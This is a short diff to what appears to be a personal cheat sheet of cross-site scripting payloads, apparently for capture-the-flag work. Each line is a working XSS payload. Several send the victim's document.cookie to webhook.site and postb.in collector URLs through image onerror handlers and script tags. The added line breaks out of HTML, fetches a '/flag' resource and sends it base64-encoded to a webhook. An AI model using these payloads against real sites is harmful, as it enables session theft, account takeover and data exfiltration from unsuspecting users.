@@ -9,10 +9,11 @@ TODO
 
 <img src=x onerror="javascript:document.location='https://postb.in/1679131873897-8807206857018?cookie='+document.cookie;">
 
-
 <script>var i=new Image;i.src="https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc/?"+document.cookie;</script>
 
 <img src=x onerror="this.src='https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc/?'+document.cookie; this.removeAttribute('onerror');">
+
+"'&<></h1><script>fetch('/flag').then(r=>{r.text().then(t=>fetch('http:webhook/?flag='+btoa(t),{'mode':'no-cors'}))})</script><h1></h1>
 ```
 
 ### vm
